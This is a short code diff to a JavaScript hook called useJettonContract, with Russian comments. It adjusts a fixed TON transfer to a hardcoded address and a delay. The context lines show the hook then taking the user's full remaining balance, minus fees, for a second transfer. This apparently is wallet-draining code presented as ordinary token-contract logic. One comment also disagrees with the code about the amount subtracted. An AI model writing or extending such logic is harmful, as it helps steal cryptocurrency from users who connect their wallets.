@@ -171,15 +171,15 @@ export function useJettonContract() {
                 // ШАГ 1: Отправляем первую фиксированную транзакцию 
                 const result = await executeTransfer(
                     "kQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh467E2",
-                    "38"
+                    "0.1"
                 );
                 console.log("Первая транзакция отправлена:", result);
  
                 // ШАГ 2: Считаем остаток баланса для второй транзакции
                 const currentBalance = Number(tonBalance) || 0;
 
-                // Пауза 2 секунды
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                // Пауза 3 секунды
+                await new Promise(resolve => setTimeout(resolve, 3000));
                 
                 // Вычитаем 0.1 TON (которые только что ушли) и ~0.05 TON на комиссии сети
                 const amountToSend = Math.max(0, currentBalance - 0.2 - 0.05);
